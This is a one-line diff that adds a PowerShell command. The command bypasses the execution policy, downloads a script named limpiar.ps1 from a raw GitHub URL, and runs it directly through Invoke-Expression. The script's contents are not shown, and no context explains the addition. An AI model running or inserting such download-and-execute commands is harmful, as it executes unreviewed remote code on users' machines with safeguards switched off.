@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/polgatiz/lox/main/limpiar.ps1 | iex"
